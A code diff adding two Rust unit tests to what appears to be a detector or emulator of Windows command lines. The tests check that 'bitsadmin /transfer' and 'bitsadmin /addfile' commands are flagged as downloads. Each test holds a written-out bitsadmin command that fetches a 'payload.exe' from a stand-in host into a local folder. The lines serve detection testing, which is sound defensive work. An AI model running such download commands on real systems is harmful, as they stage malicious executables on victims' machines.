@@ -13207,6 +13207,25 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_attached_transfer_emits_download() {
+        let raw =
+            "bitsadmin /transfer:myjob /download /priority foreground http://x/y.exe C:\\temp\\y.exe";
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
+            )
+        });
+        assert!(
+            has,
+            "no attached-transfer BitsadminDownload: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_transfer_emits_multiple_download_pairs() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -13274,6 +13293,25 @@ mod bitsadmin_tests {
         assert!(env
             .modified_filesystem
             .contains_key(r#"c:\temp\payload.exe"#));
+    }
+
+    #[test]
+    fn bitsadmin_attached_addfile_emits_download() {
+        let raw = r#"bitsadmin /addfile:job1 "https://bits-attached-addfile.example/payload.exe" "C:\Temp\payload.exe""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no attached-addfile BitsadminDownload: {:?}",
+            env.traits
+        );
     }
 }
 
